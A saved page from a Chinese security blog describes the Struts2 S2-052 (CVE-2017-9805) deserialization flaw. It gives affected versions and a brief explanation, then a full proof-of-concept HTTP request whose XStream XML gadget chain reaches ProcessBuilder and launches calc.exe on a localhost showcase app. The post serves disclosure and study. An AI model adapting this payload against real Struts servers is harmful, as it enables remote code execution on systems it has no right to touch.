@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>struts2 远程代码执行漏洞s2-052 | shackle</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="keywords" content="漏洞" />
+  
+  
+  
+  
+  <meta name="description" content="Struts2 远程代码执行漏洞S2-052 2017-09-06 Struts2 远程代码执行漏洞 : S2-052Struts2 应用又曝出存在新的高危远程代码执行漏洞。该漏洞由lgtm.com的安全研究员汇报，编号为 CVE-2017-9805 ，漏洞危害程度为高危（Critical）。当用户使用带有 XStream 程序的 Struts REST 插件来处理 XML payloads 时，">
+<meta name="keywords" content="漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Struts2 远程代码执行漏洞S2-052">
+<meta property="og:url" content="http://yoursite.com/2017/09/06/Struts2 远程代码执行漏洞S2-052/index.html">
+<meta property="og:site_name" content="shackle">
+<meta property="og:description" content="Struts2 远程代码执行漏洞S2-052 2017-09-06 Struts2 远程代码执行漏洞 : S2-052Struts2 应用又曝出存在新的高危远程代码执行漏洞。该漏洞由lgtm.com的安全研究员汇报，编号为 CVE-2017-9805 ，漏洞危害程度为高危（Critical）。当用户使用带有 XStream 程序的 Struts REST 插件来处理 XML payloads 时，">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://osuq6jhys.bkt.clouddn.com/s2-052.png">
+<meta property="og:updated_time" content="2018-03-29T23:22:30.424Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Struts2 远程代码执行漏洞S2-052">
+<meta name="twitter:description" content="Struts2 远程代码执行漏洞S2-052 2017-09-06 Struts2 远程代码执行漏洞 : S2-052Struts2 应用又曝出存在新的高危远程代码执行漏洞。该漏洞由lgtm.com的安全研究员汇报，编号为 CVE-2017-9805 ，漏洞危害程度为高危（Critical）。当用户使用带有 XStream 程序的 Struts REST 插件来处理 XML payloads 时，">
+<meta name="twitter:image" content="http://osuq6jhys.bkt.clouddn.com/s2-052.png">
+  
+    <link rel="alternate" href="/atom.xml" title="shackle" type="application/atom+xml">
+  
+
+  
+
+  <link rel="icon" href="/css/images/mylogo.jpg">
+  <link rel="apple-touch-icon" href="/css/images/mylogo.jpg">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
+  <link rel="stylesheet" href="/css/style.css">
+
+  <script src="/js/jquery-3.1.1.min.js"></script>
+  <script src="/js/bootstrap.js"></script>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+
+  
+    <link rel="stylesheet" href="/css/dialog.css">
+  
+
+  
+
+  
+    <link rel="stylesheet" href="/css/header-post.css" >
+  
+
+  
+  
+  
+
+</head>
+
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+  <div id="container">
+    <div id="wrap">
+      
+        <header>
+
+    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
+        <div class="navbar-inner">
+          
+          <div class="container"> 
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+              <span class="sr-only">Toggle navigation</span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+
+            
+              <a class="brand" style="
+                 margin-top: 0px;"  
+                href="#" data-toggle="modal" data-target="#myModal" >
+                  <img width="124px" height="124px" alt="Hike News" src="/css/images/mylogo.jpg">
+              </a>
+            
+            
+            <div class="navbar-collapse collapse">
+              <ul class="hnav navbar-nav">
+                
+                  <li> <a class="main-nav-link" href="/">首页</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/archives">归档</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/categories">分类</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/tags">标签</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/about">关于</a> </li>
+                
+                  <li><div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="请输入关键词..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(无标题)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+</div></li>
+            </div>
+          </div>
+                
+      </div>
+    </div>
+
+</header>
+
+
+
+      
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-Struts2 远程代码执行漏洞S2-052" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      Struts2 远程代码执行漏洞S2-052
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2017/09/06/Struts2 远程代码执行漏洞S2-052/" class="article-date">
+	  <time datetime="2017-09-06T15:53:56.000Z" itemprop="datePublished">2017-09-06</time>
+	</a>
+
+      
+      
+	<a class="article-views">
+	<span id="busuanzi_container_page_pv">
+		阅读量<span id="busuanzi_value_page_pv"></span>
+	</span>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Struts2-远程代码执行漏洞S2-052"><a href="#Struts2-远程代码执行漏洞S2-052" class="headerlink" title="Struts2 远程代码执行漏洞S2-052"></a>Struts2 远程代码执行漏洞S2-052</h1><p><a href="http://shackles.top/2017/09/06/S2-052/" target="_blank" rel="noopener"> 2017-09-06</a></p>
+<h2 id="Struts2-远程代码执行漏洞-S2-052"><a href="#Struts2-远程代码执行漏洞-S2-052" class="headerlink" title="Struts2 远程代码执行漏洞 : S2-052"></a>Struts2 远程代码执行漏洞 : S2-052</h2><p>Struts2 应用又曝出存在新的高危远程代码执行漏洞。该漏洞由lgtm.com的安全研究员汇报，编号为 CVE-2017-9805 ，漏洞危害程度为高危（Critical）。当用户使用带有 XStream 程序的 Struts REST 插件来处理 XML payloads 时，可能会遭到远程代码执行攻击。</p>
+<ul>
+<li>前提：启用Strut REST 插件。</li>
+<li>Struts 2.5 – Struts 2.5.12 版本</li>
+<li>官方公告：<a href="https://cwiki.apache.org/confluence/display/WW/S2-052" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-052</a></li>
+<li>漏洞编号：S2-052</li>
+<li>CVE-2017-9805</li>
+</ul>
+<h3 id="S2-052概述"><a href="#S2-052概述" class="headerlink" title="S2-052概述"></a>S2-052概述</h3><p>Struts2 REST 插件使用带有 XStream 程序的 XStream Handler 进行未经任何代码过滤的反序列化操作，这可能在反序列化XML payloads时导致远程代码执行。任意攻击者都可以构造恶意的XML内容提升权限。</p>
+<p>漏洞是由 Semmle 使用其开源分析工具 lgtm 及 QL 语言编写的 Java 反序列威胁查询检测而出的，详情可参考<br><a href="https://lgtm.com/blog/apache_struts_CVE-2017-9805" target="_blank" rel="noopener">https://lgtm.com/blog/apache_struts_CVE-2017-9805</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">org.apache.struts2.rest.handler.AllowedClasses</span><br><span class="line"></span><br><span class="line">org.apache.struts2.rest.handler.AllowedClassNames</span><br><span class="line"></span><br><span class="line">org.apache.struts2.rest.handler.XStreamPermissionProvider</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET /struts2-rest-showcase/orders.xhtml HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Referer: http://127.0.0.1:8080/struts2-rest-showcase/orders/3/edit</span><br><span class="line">Cookie: JSESSIONID=6FBA41434A908795E708AE545267C797; UM_distinctid=15e36471d10d0-09d67d334fbd0f8-49594234-100200-15e36471d11231; CNZZDATA1670348=cnzz_eid%3D1690420666-1504145890-%26ntime%3D1504329636</span><br><span class="line">Connection: close</span><br><span class="line">If-None-Match: 182927695</span><br><span class="line">Content-Length: 1647</span><br><span class="line"></span><br><span class="line">&lt;map&gt; </span><br><span class="line">&lt;entry&gt; </span><br><span class="line">&lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt; &lt;dataHandler&gt; &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt; &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt; &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt; &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;command&gt; &lt;string&gt;C:\Windows\System32\calc.exe&lt;/string&gt; &lt;/command&gt; &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;done&gt;false&lt;/done&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;false&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; </span><br><span class="line">&lt;/entry&gt; </span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="效果如下："><a href="#效果如下：" class="headerlink" title="效果如下："></a>效果如下：</h3><p><a href="http://osuq6jhys.bkt.clouddn.com/s2-052.png" target="_blank" rel="noopener"><img src="http://osuq6jhys.bkt.clouddn.com/s2-052.png" alt="效果图"></a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+        
+	<div id="comment">
+		<!-- 来必力City版安装代码 -->
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8zNTMwOS8xMTg0NQ">
+		<script type="text/javascript">
+		   (function(d, s) {
+		       var j, e = d.getElementsByTagName(s)[0];
+
+		       if (typeof LivereTower === 'function') { return; }
+
+		       j = d.createElement(s);
+		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+		       j.async = true;
+
+		       e.parentNode.insertBefore(j, e);
+		   })(document, 'script');
+		</script>
+		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+		</div>
+		<!-- City版安装代码已完成 -->
+	</div>
+
+
+
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞/">漏洞</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/09/09/车联网安全基础/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">上一篇</strong>
+      <div class="article-nav-title">
+        
+          hello
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/08/29/CTF-逆向 基础/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇</strong>
+      <div class="article-nav-title">CTF-逆向 基础</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="toc-sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Struts2-远程代码执行漏洞S2-052"><span class="nav-number">1.</span> <span class="nav-text">Struts2 远程代码执行漏洞S2-052</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Struts2-远程代码执行漏洞-S2-052"><span class="nav-number">1.1.</span> <span class="nav-text">Struts2 远程代码执行漏洞 : S2-052</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#S2-052概述"><span class="nav-number">1.1.1.</span> <span class="nav-text">S2-052概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞POC"><span class="nav-number">1.1.2.</span> <span class="nav-text">漏洞POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#效果如下："><span class="nav-number">1.1.3.</span> <span class="nav-text">效果如下：</span></a></li></ol></li></ol></li></ol>
+    
+    </div>
+  </aside>
+</section>
+        
+      </div>
+      
+      <footer id="footer">
+  
+
+  <div class="container">
+      	<div class="row">
+	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
+	      <p id="copyRightEn">Copyright &copy; 2013 - 2018 shackle All Rights Reserved.</p>
+	      
+	      
+    		<p class="busuanzi_uv">
+				访客数 : <span id="busuanzi_value_site_uv"></span> |  
+				访问量 : <span id="busuanzi_value_site_pv"></span>
+		    </p>
+  		   
+		</div>
+
+		
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+    var allheader = document.getElementById("allheader");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
+    if (allheader != null) {
+      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    } else {
+      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    }
+</script>
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/categories" class="mobile-nav-link">Categories</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav> -->
+    
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/scripts.js"></script>
+
+
+
+
+  <script src="/js/dialog.js"></script>
+
+
+
+
+
+
+
+
+	<div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1261091520&web_id=1261091520" language="JavaScript"></script>
+  </div>
+
+
+
+	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+	</script>
+
+
+
+
+
+
+  </div>
+
+  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title" id="myModalLabel">设置</h2>
+      </div>
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+
+
+      <div class="modal-body">
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
+              正文字号大小
+            </a>
+          </div>
+          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
+          <div class="panel-body">
+            您已调整页面字体大小
+          </div>
+        </div>
+      
+
+
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
+              夜间护眼模式
+            </a>
+        </div>
+          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
+          <div class="panel-body">
+            夜间模式已经开启，再次单击按钮即可关闭 
+          </div>
+        </div>
+
+        <div>
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+        </div>
+         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
+          <div class="panel-body">
+            shackle
+          </div>
+          <div class="panel-body">
+            Copyright © 2018 shackle All Rights Reserved.
+          </div>
+        </div>
+      </div>
+
+
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <div class="modal-footer">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+      </div>
+    </div>
+  </div>
+</div>
+  
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+  
+    <a id="menu-switch"><i class="fa fa-bars fa-lg"></i></a>
+  
+</body>
+</html>
